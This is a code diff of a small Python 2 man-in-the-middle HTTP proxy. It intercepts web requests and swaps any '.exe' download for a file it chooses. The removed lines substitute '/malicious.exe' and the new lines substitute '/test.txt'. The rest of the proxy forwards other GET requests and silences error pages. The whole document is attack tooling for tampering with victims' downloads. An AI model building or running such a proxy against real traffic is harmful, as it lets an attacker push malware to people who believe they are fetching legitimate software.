@@ -1,24 +1,22 @@
-# inline file swapper for web MITM
-
 import SocketServer
 import SimpleHTTPServer
-import urllib
+import urllib, urllib2
+import re
+import os
 
-PORT = 80
+PORT = 1234
 
 class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    error_message_format = ""
+    def send_error(self, code, message):
+        return
     def do_GET(self):
-        # manages swapping exe files
-        if self.path[(len(str))-3:] == "exe":
-          self.path="/malicious.exe"
-        # extremely simple forwarder
-        # fails in all but simple GETs
+        if self.path[len(self.path)-3:] == "exe":
+                self.path="/test.txt"
         else:
-            urlhandle = urllib.urlopen(self.path)
-            self.wfile.write(urlhandle.read())
+                urlhandle = urllib.urlopen(self.path)
+                self.wfile.write(urlhandle.read())
         return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
-    def do_POST(self):
-        # TODO
 
 
 httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
